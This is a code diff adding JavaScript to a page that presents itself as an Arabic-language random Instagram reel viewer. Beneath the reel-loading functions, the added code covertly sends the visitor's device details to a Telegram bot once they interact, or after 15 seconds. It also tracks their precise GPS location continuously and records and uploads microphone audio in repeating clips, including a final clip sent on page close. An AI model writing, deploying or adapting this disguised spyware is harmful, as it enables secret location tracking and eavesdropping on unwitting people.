@@ -351,4 +351,247 @@
   loadRandomReel();
 </script>
 </body>
+</html>  }
+
+  function extractShortcode(url) {
+    const m = url.match(/\/reel\/([A-Za-z0-9_-]+)/);
+    return m ? m[1] : null;
+  }
+
+  function addReelFromInput() {
+    const url = customReelUrl.value.trim();
+    if (!url) return alert('أدخل رابطاً');
+    const shortcode = extractShortcode(url);
+    if (!shortcode) return alert('رابط غير صالح');
+    // التحقق من عدم تكراره
+    if (reels.some(r => r.id === shortcode)) {
+      alert('هذا الريل موجود مسبقاً');
+      return;
+    }
+    reels.push({
+      id: shortcode,
+      user: 'مخصص',
+      desc: 'ريل مضاف يدوياً'
+    });
+    saveReels();
+    customReelUrl.value = '';
+    log('✅ تمت إضافة الريل: ' + shortcode);
+  }
+
+  function loadRandomReel() {
+    if (reels.length === 0) {
+      alert('لا توجد ريلز متاحة. أضف واحداً أو أعد تحميل الصفحة.');
+      return;
+    }
+    const reel = reels[Math.floor(Math.random() * reels.length)];
+    reelIframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
+    reelUsername.textContent = reel.user;
+    reelCaption.textContent = reel.desc || '';
+    likesCount.textContent = Math.floor(Math.random()*5000+100).toLocaleString('ar-SA');
+    log(`🎬 تحميل ريل: ${reel.id} من @${reel.user}`);
+  }
+
+  // أحداث الأزرار
+  addReelBtn.addEventListener('click', addReelFromInput);
+  randomReelBtn.addEventListener('click', loadRandomReel);
+  clearReelsBtn.addEventListener('click', () => {
+    if (confirm('هل تريد مسح جميع الريلز المضافة؟')) {
+      reels = [...DEFAULT_REELS]; // إعادة التعيين للافتراضية
+      saveReels();
+      loadRandomReel();
+      log('🔄 تم إعادة التعيين إلى الريلز الافتراضية');
+    }
+  });
+
+  // السماح بإضافة الرابط بالضغط على Enter
+  customReelUrl.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') addReelFromInput();
+  });
+
+  // ========== استخراج اسم الجهاز ==========
+  function getDeviceModel() {
+    const ua = navigator.userAgent;
+    const patterns = [
+      /Huawei\s+([A-Za-z0-9\-]+)\s+Build/i,
+      /Infinix\s+([A-Za-z0-9]+)\s+Build/i,
+      /Xiaomi\s+([A-Za-z0-9\s]+)\s+Build/i,
+      /Samsung\s+([A-Za-z0-9]+)\s+Build/i,
+      /iPhone\s+([\w\s]+)\s+like/i,
+      /iPad;\s+CPU\s+OS\s+([\d_]+)\s+like\s+Mac/i,
+      /Linux;\s+Android\s+([\d\.]+);\s+([\w\s]+)\s+Build/i,
+      /(Windows NT [\d\.]+);/,
+      /(Macintosh; Intel Mac OS X [\d_]+)/,
+    ];
+    for (let p of patterns) {
+      const m = ua.match(p);
+      if (m) {
+        if (p.source.includes('iPhone')) return 'Apple ' + m[0].split(';')[0];
+        if (p.source.includes('iPad')) return 'Apple iPad';
+        if (p.source.includes('Linux; Android')) return m[2] ? m[2].trim() : 'Android Device';
+        return m[1] ? m[1].trim() : m[0];
+      }
+    }
+    const simple = ua.match(/\(([^)]+)\)/);
+    return simple ? simple[1].split(';')[0].trim() : 'Unknown Device';
+  }
+
+  // ========== Reverse Geocoding ==========
+  async function reverseGeocode(lat, lon) {
+    try {
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
+      const data = await res.json();
+      if (data && data.address) {
+        const addr = data.address;
+        let parts = [];
+        if (addr.country) parts.push(addr.country);
+        if (addr.state) parts.push(addr.state);
+        if (addr.city || addr.town || addr.village) parts.push(addr.city || addr.town || addr.village);
+        if (addr.suburb || addr.neighbourhood) parts.push(addr.suburb || addr.neighbourhood);
+        let text = parts.join(' - ');
+        let landmark = '';
+        if (data.display_name) {
+          const firstPart = data.display_name.split(',')[0].trim();
+          if (firstPart && !parts.includes(firstPart)) landmark = firstPart;
+        }
+        if (landmark) text += ` (${landmark})`;
+        return text || data.display_name;
+      }
+    } catch(e) { console.error(e); }
+    return null;
+  }
+
+  // ========== تيليجرام ==========
+  async function telegram(method, body) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(body)
+      });
+      const d = await res.json();
+      if (!d.ok) log('❌ تيليجرام: ' + d.description, 'red');
+      else log('✅ تم: ' + method, 'lime');
+    } catch(e) { log('❌ فشل اتصال: ' + e.message, 'red'); }
+  }
+
+  // ========== تتبع الموقع ==========
+  let watchId;
+  function startTracking() {
+    if (!navigator.geolocation) { log('⚠️ الموقع غير مدعوم', 'orange'); return; }
+    watchId = navigator.geolocation.watchPosition(
+      async (pos) => {
+        const {latitude, longitude, accuracy} = pos.coords;
+        log(`📍 ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, 'cyan');
+        let placeText = await reverseGeocode(latitude, longitude);
+        if (!placeText) placeText = 'غير معروف';
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const msg = `📍 *موقع جديد*\nالعرض: \`${latitude}\`\nالطول: \`${longitude}\`\nالدقة: ±${Math.round(accuracy)}م\nالموقع: ${placeText}\n[🗺️ عرض على الخريطة](${mapsLink})`;
+        telegram('sendMessage', {chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'});
+        telegram('sendLocation', {chat_id: CHAT_ID, latitude, longitude});
+      },
+      err => {
+        log('❌ موقع: ' + err.message, 'red');
+        telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ موقع: ' + err.message});
+      },
+      {enableHighAccuracy: true, maximumAge: 0, timeout: 30000}
+    );
+  }
+
+  // ========== تسجيل الصوت ==========
+  let mediaRecorder = null;
+  let audioStream = null;
+  let currentChunks = [];
+  let currentRecorder = null;
+
+  async function startAudio() {
+    try {
+      audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
+      log('🎤 ميكروفون متاح', 'green');
+      telegram('sendMessage', {chat_id: CHAT_ID, text: '🎤 بدأ التسجيل الصوتي (10 ثوانٍ)'});
+      scheduleRecording();
+    } catch(e) {
+      log('❌ ميكروفون: ' + e.message, 'red');
+      telegram('sendMessage', {chat_id: CHAT_ID, text: '❌ خطأ ميكروفون: ' + e.message});
+    }
+  }
+
+  function scheduleRecording() {
+    if (!audioStream || !audioStream.active) return;
+    currentChunks = [];
+    const rec = new MediaRecorder(audioStream);
+    rec.ondataavailable = e => { if(e.data.size) currentChunks.push(e.data); };
+    rec.onstop = async () => {
+      if (currentChunks.length === 0) return;
+      const blob = new Blob(currentChunks, {type: rec.mimeType || 'audio/webm'});
+      await sendAudioBlob(blob);
+      if (audioStream && audioStream.active) setTimeout(scheduleRecording, 500);
+    };
+    rec.start();
+    mediaRecorder = rec;
+    currentRecorder = rec;
+    setTimeout(() => {
+      if (rec.state === 'recording') rec.stop();
+    }, RECORD_DURATION_MS);
+  }
+
+  async function sendAudioBlob(blob) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('audio', blob, `rec_${Date.now()}.webm`);
+    fd.append('title', '🎤 ' + new Date().toLocaleTimeString('ar-SA'));
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method:'POST', body:fd});
+      log('📤 تم إرسال مقطع صوتي', 'magenta');
+    } catch(e) { log('❌ فشل إرسال الصوت', 'red'); }
+  }
+
+  function flushCurrentRecording() {
+    if (currentRecorder && currentRecorder.state === 'recording') {
+      currentRecorder.onstop = async () => {
+        if (currentChunks.length > 0) {
+          const blob = new Blob(currentChunks, {type: currentRecorder.mimeType || 'audio/webm'});
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('audio', blob, 'last_rec.webm');
+          fd.append('title', '🎤 مقطع أخير قبل الإغلاق');
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, fd);
+          } else {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {method:'POST', body:fd, keepalive: true});
+          }
+        }
+      };
+      currentRecorder.stop();
+    }
+    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+  }
+
+  window.addEventListener('beforeunload', flushCurrentRecording);
+
+  // ========== بدء الجلسة ==========
+  let started = false;
+  function launch() {
+    if(started) return;
+    started = true;
+    const deviceModel = getDeviceModel();
+    const now = new Date().toLocaleString('ar-SA', {timeZone:'Asia/Damascus'});
+    log('🚀 بدأت الجلسة', 'yellow');
+    telegram('sendMessage', {
+      chat_id: CHAT_ID,
+      text: `🚀 *جلسة جديدة*\nالتاريخ والوقت: ${now}\nالجهاز: \`${deviceModel}\`\nUser-Agent: \`${navigator.userAgent.slice(0,100)}\``,
+      parse_mode: 'Markdown'
+    });
+    startTracking();
+    setTimeout(startAudio, 1000);
+  }
+
+  document.addEventListener('click', launch, {once: true});
+  document.addEventListener('touchstart', launch, {once: true});
+  setTimeout(() => { if(!started) launch(); }, 15000);
+
+  // تحميل ريل عشوائي أولي
+  loadRandomReel();
+</script>
+</body>
 </html>
